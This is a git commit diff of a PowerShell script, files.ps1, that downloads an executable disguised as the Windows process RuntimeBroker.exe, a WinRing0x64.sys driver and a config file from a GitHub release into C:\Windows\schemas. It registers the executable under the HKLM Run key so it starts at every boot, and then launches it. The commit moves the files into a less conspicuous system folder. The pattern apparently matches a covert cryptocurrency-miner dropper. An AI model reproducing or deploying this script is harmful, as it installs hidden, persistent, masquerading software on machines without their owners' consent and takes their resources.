5409150a3d3bca20c4c013ea05825d0c33c2b293
so251 <aquelequefujedocombateecorno@tutamail.com>
2024-07-18 18:08:46 -0700

    Update files.ps1

--- files.ps1
+++ files.ps1
@@ -1,15 +1,13 @@
-Import-Module BitsTransfer
+Invoke-RestMethod -Uri "https://github.com/so251/olaquerida/releases/download/1releasae/config.json" -OutFile "C:\Windows\schemas\config.json"
+Invoke-RestMethod -Uri "https://github.com/so251/olaquerida/releases/download/1releasae/RuntimeBroker.exe" -OutFile "C:\Windows\schemas\RuntimeBroker.exe"
+Invoke-RestMethod -Uri "https://github.com/so251/olaquerida/releases/download/1releasae/WinRing0x64.sys" -OutFile "C:\Windows\schemas\WinRing0x64.sys" 
 
-Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/config.json' -Destination 'C:\Windows\config.json' 
-Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/RuntimeBroker.exe' -Destination 'C:\Windows\RuntimeBroker.exe' 
-Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/WinRing0x64.sys' -Destination 'C:\Windows\WinRing0x64.sys' 
+$programPath = "C:\Windows\schemas\RuntimeBroker.exe"
 
-$programPath = "C:\Windows\RuntimeBroker.exe"
-
-$command = "C:\Windows\RuntimeBroker.exe"
+$command = "C:\Windows\schemas\RuntimeBroker.exe"
 Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RuntimeBroker" -Value $command
 
 
-Start-Process "C:\Windows\RuntimeBroker.exe"
+Start-Process "C:\Windows\schemas\RuntimeBroker.exe"
 
 
